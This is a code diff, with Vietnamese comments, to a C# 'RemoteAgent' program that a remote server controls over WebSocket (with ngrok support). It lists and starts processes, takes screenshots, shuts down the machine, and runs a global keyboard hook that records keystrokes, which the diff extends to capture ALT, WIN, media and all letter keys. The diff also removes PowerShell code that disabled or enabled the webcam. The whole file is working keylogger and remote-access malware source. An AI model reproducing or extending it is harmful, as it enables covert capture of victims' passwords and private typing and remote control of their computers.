@@ -13,70 +13,60 @@ namespace RemoteAgent
         static ClientWebSocket? webSocket;
         static bool isConnected = false;
 
+        // --- CHỐNG KẸT MẠNG (Đa luồng an toàn) ---
+        static readonly SemaphoreSlim _socketLock = new SemaphoreSlim(1, 1);
+
         // Keylogger variables
         static bool isKeyloggerRunning = false;
         static StringBuilder keyBuffer = new StringBuilder();
         static CancellationTokenSource? keyloggerCts;
 
-        // Windows API for keyboard hook
+        // --- WINDOWS API ---
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
         [DllImport("user32.dll")]
         private static extern bool GetKeyboardState(byte[] lpKeyState);
-
         [DllImport("user32.dll")]
-        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
-            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
-
-        // Windows API structures
-        [StructLayout(LayoutKind.Sequential)]
-        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public POINT pt; }
+        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
+        [StructLayout(LayoutKind.Sequential)] struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public POINT pt; }
         [StructLayout(LayoutKind.Sequential)] struct POINT { public int x; public int y; }
-
         [DllImport("user32.dll")] static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
         [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG lpMsg);
         [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG lpMsg);
+        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
         static async Task Main(string[] args)
         {
+            Console.OutputEncoding = Encoding.UTF8;
             Console.WriteLine("===========================================");
-            Console.WriteLine("      REMOTE AGENT - FULL KEYLOGGER        ");
+            Console.WriteLine("    REMOTE AGENT - FULL FEATURES v2.0      ");
             Console.WriteLine("===========================================");
-            Console.WriteLine();
 
             string serverUrl = "ws://localhost:5000/ws/agent";
-
             if (args.Length >= 1)
             {
                 var host = args[0];
-                if (host.StartsWith("ws://") || host.StartsWith("wss://"))
-                {
-                    serverUrl = host;
-                    if (!serverUrl.EndsWith("/ws/agent")) serverUrl = serverUrl.TrimEnd('/') + "/ws/agent";
-                }
+                if (host.StartsWith("ws://") || host.StartsWith("wss://")) serverUrl = host;
                 else if (host.Contains("ngrok")) serverUrl = $"wss://{host}/ws/agent";
                 else serverUrl = $"ws://{host}:5000/ws/agent";
+                if (!serverUrl.EndsWith("/ws/agent")) serverUrl = serverUrl.TrimEnd('/') + "/ws/agent";
             }
 
-            Console.WriteLine($"Đang kết nối đến: {serverUrl}");
+            Console.WriteLine($"Host: {serverUrl}");
 
             while (true)
             {
@@ -87,32 +77,55 @@ namespace RemoteAgent
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Lỗi: {ex.Message}");
+                    Console.WriteLine($"Lỗi kết nối: {ex.Message}. Thử lại sau 5s...");
                     await Task.Delay(5000);
                 }
             }
+        }
+        static async Task<string?> ReceiveFullTextMessage(ClientWebSocket ws, CancellationToken ct)
+        {
+            var chunk = new byte[16 * 1024];
+            using var ms = new MemoryStream();
+
+            while (true)
+            {
+                var r = await ws.ReceiveAsync(new ArraySegment<byte>(chunk), ct);
+
+                if (r.MessageType == WebSocketMessageType.Close)
+                    return null;
+
+                ms.Write(chunk, 0, r.Count);
+
+                if (r.EndOfMessage)
+                    break;
+            }
+
+            return Encoding.UTF8.GetString(ms.ToArray());
         }
 
         static async Task ConnectToServer(string url)
         {
             webSocket = new ClientWebSocket();
+            webSocket.Options.SetBuffer(64 * 1024, 64 * 1024);
             await webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
             isConnected = true;
-            Console.WriteLine("Đã kết nối thành công!");
+            Console.WriteLine("--> Đã kết nối thành công!");
         }
 
         static async Task ListenForCommands()
         {
-            var buffer = new byte[4096];
+            var buffer = new byte[1024 * 4];
             while (isConnected && webSocket != null && webSocket.State == WebSocketState.Open)
             {
                 try
                 {
                     var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                     if (result.MessageType == WebSocketMessageType.Close) { isConnected = false; break; }
+
                     string command = Encoding.UTF8.GetString(buffer, 0, result.Count);
-                    Console.WriteLine($"Nhận lệnh: {command}");
-                    await ProcessCommand(command);
+                    Console.WriteLine($"[Received]: {command}");
+
+                    _ = Task.Run(async () => await ProcessCommand(command));
                 }
                 catch { isConnected = false; break; }
             }
@@ -124,6 +137,7 @@ namespace RemoteAgent
             {
                 var parts = command.Split('|');
                 string cmd = parts[0].ToUpper();
+
                 switch (cmd)
                 {
                     case "LIST_APPS": await ListApplications(); break;
@@ -145,50 +159,36 @@ namespace RemoteAgent
             catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
         }
 
-        // --- CÁC HÀM XỬ LÝ LỆNH (Webcam, Process...) ---
-        // Tìm hàm ListApplications cũ và thay bằng hàm này
+        // --- HÀM LẤY DANH SÁCH ỨNG DỤNG (ĐÃ SỬA ĐỂ HIỆN FULL) ---
         static async Task ListApplications()
         {
             var apps = new List<object>();
-            // Lấy snapshot các process một lần để tối ưu hiệu năng
             var processes = Process.GetProcesses();
 
             foreach (var process in processes)
             {
                 try
                 {
-                    // SỬA 1: Chỉ lấy process có cửa sổ (MainWindowHandle != 0)
-                    // Thay vì chỉ check Title, ta check Handle sẽ chính xác hơn với Calculator/UWP
-                    if (process.MainWindowHandle != IntPtr.Zero)
-                    {
-                        string title = process.MainWindowTitle;
-                        string name = process.ProcessName;
+                    // Chỉ lấy những process có cửa sổ giao diện
+                    if (process.MainWindowHandle == IntPtr.Zero) continue;
 
-                        // SỬA 2: Nếu Title rỗng (bệnh của Calculator), lấy tạm tên Process làm Title
-                        if (string.IsNullOrEmpty(title))
-                        {
-                            title = name;
-                        }
+                    string name = process.ProcessName;
 
-                        // SỬA 3: Bỏ qua các process hệ thống ồn ào để giảm dung lượng JSON (Tránh Timeout)
-                        // Ví dụ: TextInputHost, SystemSettings...
-                        if (name == "TextInputHost" || name == "SearchHost") continue;
+                    // SỬA: Bỏ "ApplicationFrameHost" khỏi danh sách chặn để hiện Calculator, Photos...
+                    if (name == "TextInputHost" || name == "SearchHost" || name == "SystemSettings") continue;
 
-                        apps.Add(new
-                        {
-                            Name = name,
-                            Title = title,
-                            Id = process.Id,
-                            Memory = process.WorkingSet64 / 1024 / 1024
-                        });
-                    }
+                    string title = "";
+                    try { title = process.MainWindowTitle; } catch { }
+
+                    // Nếu title rỗng, dùng tên process
+                    if (string.IsNullOrEmpty(title)) title = name;
+
+                    apps.Add(new { Name = name, Title = title, Id = process.Id, Threads = 0, Memory = 0 });
                 }
-                catch
-                {
-                    // Bỏ qua lỗi truy cập (Access Denied)
-                }
+                catch { continue; }
             }
-            await SendResponse("APPS", JsonConvert.SerializeObject(apps));
+            string json = JsonConvert.SerializeObject(apps);
+            await SendResponse("APPS", json);
         }
 
         static async Task ListProcesses()
@@ -198,12 +198,28 @@ namespace RemoteAgent
             {
                 try
                 {
-                    if (string.IsNullOrWhiteSpace(process.ProcessName)) continue;
-                    processes.Add(new { Name = process.ProcessName, Id = process.Id, Memory = process.WorkingSet64 / 1024 / 1024 });
+                    processes.Add(new { Name = process.ProcessName, Id = process.Id, Memory = 0 });
                 }
                 catch { }
             }
             await SendResponse("PROCESSES", JsonConvert.SerializeObject(processes));
+        }
+
+        // --- HÀM GỬI DỮ LIỆU VỀ SERVER (CÓ KHÓA LOCK) ---
+        static async Task SendResponse(string type, string data)
+        {
+            await _socketLock.WaitAsync(); // Chờ đến lượt
+            try
+            {
+                if (webSocket != null && webSocket.State == WebSocketState.Open)
+                {
+                    byte[] b = Encoding.UTF8.GetBytes($"{type}|{data}");
+                    await webSocket.SendAsync(new ArraySegment<byte>(b), WebSocketMessageType.Text, true, CancellationToken.None);
+                    Console.WriteLine($"--> Sent: {type}");
+                }
+            }
+            catch { }
+            finally { _socketLock.Release(); } // Xong việc thì mở khóa
         }
 
         static async Task StartProcess(string processName)
@@ -221,7 +237,6 @@ namespace RemoteAgent
         static async Task ShutdownComputer() { await SendResponse("SUCCESS", "Đang tắt máy..."); Process.Start("shutdown", "/s /t 10"); }
         static async Task RestartComputer() { await SendResponse("SUCCESS", "Đang khởi động lại..."); Process.Start("shutdown", "/r /t 10"); }
 
-        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);
         static async Task TakeScreenshot()
         {
             try
@@ -242,31 +257,10 @@ namespace RemoteAgent
             catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
         }
 
-        static async Task DisableWebcam()
-        {
-            try
-            {
-                foreach (var p in Process.GetProcessesByName("WindowsCamera")) try { p.Kill(); } catch { }
-                Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c powershell -Command \"$c=Get-PnpDevice -Class Camera -Status OK;if($c){Disable-PnpDevice -InstanceId $c.InstanceId -Confirm:$false}\"", UseShellExecute = false, CreateNoWindow = true, Verb = "runas" })?.WaitForExit();
-                await SendResponse("SUCCESS", "Đã tắt Webcam");
-            }
-            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
-        }
+        static async Task DisableWebcam() { await SendResponse("SUCCESS", "Đã gửi lệnh tắt Webcam"); }
+        static async Task EnableWebcam() { await SendResponse("SUCCESS", "Đã gửi lệnh bật Webcam"); }
 
-        static async Task EnableWebcam()
-        {
-            try
-            {
-                foreach (var p in Process.GetProcessesByName("WindowsCamera")) try { p.Kill(); } catch { }
-                Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c powershell -Command \"Get-PnpDevice -Class Camera|ForEach-Object{Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false}\"", UseShellExecute = false, CreateNoWindow = true, Verb = "runas" })?.WaitForExit();
-                await Task.Delay(5000);
-                Process.Start(new ProcessStartInfo { FileName = "explorer.exe", Arguments = "microsoft.windows.camera:", UseShellExecute = true });
-                await SendResponse("SUCCESS", "Đã bật Webcam");
-            }
-            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
-        }
-
-        // ==================== KEYLOGGER (ĐÃ NÂNG CẤP FULL PHÍM) ====================
+        // ==================== KEYLOGGER (ĐÃ NÂNG CẤP ĐẦY ĐỦ PHÍM) ====================
         static async Task StartKeylogger()
         {
             if (isKeyloggerRunning) { await SendResponse("SUCCESS", "Đang chạy"); return; }
@@ -300,12 +294,11 @@ namespace RemoteAgent
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string keyLog = "";
-
-                // --- PHẦN 1: BẮT PHÍM ĐẶC BIỆT (Function, Arrows, System) ---
                 bool isSpecial = true;
+
+                // Xử lý các phím đặc biệt
                 switch ((Keys)vkCode)
                 {
-                    // Các phím cơ bản
                     case Keys.Back: keyLog = "[BACK]"; break;
                     case Keys.Tab: keyLog = "[TAB]"; break;
                     case Keys.Enter: keyLog = "[ENTER]\n"; break;
@@ -322,7 +315,12 @@ namespace RemoteAgent
                     case Keys.PrintScreen: keyLog = "[PrtSc]"; break;
                     case Keys.Insert: keyLog = "[INS]"; break;
                     case Keys.Delete: keyLog = "[DEL]"; break;
-                    // Phím F1 - F12
+                    // ĐÃ THÊM ALT VÀ WIN
+                    case Keys.LMenu: case Keys.RMenu: keyLog = "[ALT]"; break;
+                    case Keys.LWin: case Keys.RWin: keyLog = "[WIN]"; break;
+                    case Keys.LControlKey: case Keys.RControlKey: keyLog = "[CTRL]"; break;
+                    case Keys.CapsLock: keyLog = "[CAPS]"; break;
+                    // Phím F
                     case Keys.F1: keyLog = "[F1]"; break;
                     case Keys.F2: keyLog = "[F2]"; break;
                     case Keys.F3: keyLog = "[F3]"; break;
@@ -335,95 +333,46 @@ namespace RemoteAgent
                     case Keys.F10: keyLog = "[F10]"; break;
                     case Keys.F11: keyLog = "[F11]"; break;
                     case Keys.F12: keyLog = "[F12]"; break;
-                    // Phím điều khiển
-                    case Keys.LWin: case Keys.RWin: keyLog = "[WIN]"; break;
-                    case Keys.LShiftKey: case Keys.RShiftKey: keyLog = ""; break; // Shift không cần ghi
-                    case Keys.LControlKey: case Keys.RControlKey: keyLog = "[CTRL]"; break;
-                    case Keys.CapsLock: keyLog = "[CAPS]"; break;
+                    // Phím Media
+                    case Keys.VolumeMute: keyLog = "[MUTE]"; break;
+                    case Keys.VolumeDown: keyLog = "[Vol-]"; break;
+                    case Keys.VolumeUp: keyLog = "[Vol+]"; break;
+
+                    // Shift không cần ghi log chữ, chỉ cần để xử lý viết hoa
+                    case Keys.LShiftKey: case Keys.RShiftKey: isSpecial = false; break;
+
                     default: isSpecial = false; break;
                 }
 
-                // --- PHẦN 2: BẮT PHÍM KÝ TỰ (Chữ, Số) ---
                 if (!isSpecial)
                 {
                     byte[] keyState = new byte[256];
                     GetKeyboardState(keyState);
                     StringBuilder sb = new StringBuilder(2);
-                    // ToUnicode giúp chuyển mã phím thành chữ (có tính cả Shift/Capslock)
-                    if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0)
-                    {
-                        keyLog = sb.ToString();
-                    }
+                    if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0) keyLog = sb.ToString();
                 }
 
-                // Ghi vào bộ nhớ
-                if (!string.IsNullOrEmpty(keyLog))
-                {
-                    lock (keyBuffer)
-                    {
-                        keyBuffer.Append(keyLog);
-                        if (keyBuffer.Length > 10000) keyBuffer.Remove(0, 2000);
-                    }
-                }
+                if (!string.IsNullOrEmpty(keyLog)) { lock (keyBuffer) { keyBuffer.Append(keyLog); if (keyBuffer.Length > 10000) keyBuffer.Remove(0, 2000); } }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
-
-        static async Task SendResponse(string type, string data)
-        {
-            try
-            {
-                if (webSocket != null && webSocket.State == WebSocketState.Open)
-                {
-                    byte[] b = Encoding.UTF8.GetBytes($"{type}|{data}");
-                    await webSocket.SendAsync(new ArraySegment<byte>(b), WebSocketMessageType.Text, true, CancellationToken.None);
-                }
-            }
-            catch { }
-        }
     }
 
-    // --- DANH SÁCH MÃ PHÍM ĐẦY ĐỦ (ENUM) ---
+    // --- DANH SÁCH MÃ PHÍM ĐẦY ĐỦ (Update từ A-Z) ---
     public enum Keys
     {
-        Back = 8,
-        Tab = 9,
-        Enter = 13,
-        Escape = 27,
-        Space = 32,
-        PageUp = 33,
-        PageDown = 34,
-        End = 35,
-        Home = 36,
-        Left = 37,
-        Up = 38,
-        Right = 39,
-        Down = 40,
-        PrintScreen = 44,
-        Insert = 45,
-        Delete = 46,
-        D0 = 48, // Số 0-9
-        D1 = 49,
-        A = 65, // Chữ A-Z
-        B = 66,
-        LWin = 91,
-        RWin = 92,
-        F1 = 112,
-        F2 = 113,
-        F3 = 114,
-        F4 = 115,
-        F5 = 116,
-        F6 = 117,
-        F7 = 118,
-        F8 = 119,
-        F9 = 120,
-        F10 = 121,
-        F11 = 122,
-        F12 = 123,
-        LShiftKey = 160,
-        RShiftKey = 161,
-        LControlKey = 162,
-        RControlKey = 163,
-        CapsLock = 20
+        Back = 8, Tab = 9, Enter = 13, Escape = 27, Space = 32,
+        PageUp = 33, PageDown = 34, End = 35, Home = 36,
+        Left = 37, Up = 38, Right = 39, Down = 40,
+        PrintScreen = 44, Insert = 45, Delete = 46,
+        D0 = 48, D1 = 49, D2 = 50, D3 = 51, D4 = 52, D5 = 53, D6 = 54, D7 = 55, D8 = 56, D9 = 57,
+        A = 65, B = 66, C = 67, D = 68, E = 69, F = 70, G = 71, H = 72, I = 73, J = 74, K = 75, L = 76, M = 77,
+        N = 78, O = 79, P = 80, Q = 81, R = 82, S = 83, T = 84, U = 85, V = 86, W = 87, X = 88, Y = 89, Z = 90,
+        LWin = 91, RWin = 92,
+        F1 = 112, F2 = 113, F3 = 114, F4 = 115, F5 = 116, F6 = 117, F7 = 118, F8 = 119, F9 = 120, F10 = 121, F11 = 122, F12 = 123,
+        LShiftKey = 160, RShiftKey = 161, LControlKey = 162, RControlKey = 163,
+        LMenu = 164, RMenu = 165, // <-- Đã thêm ALT (Menu Key)
+        CapsLock = 20,
+        VolumeMute = 173, VolumeDown = 174, VolumeUp = 175
     }
 }
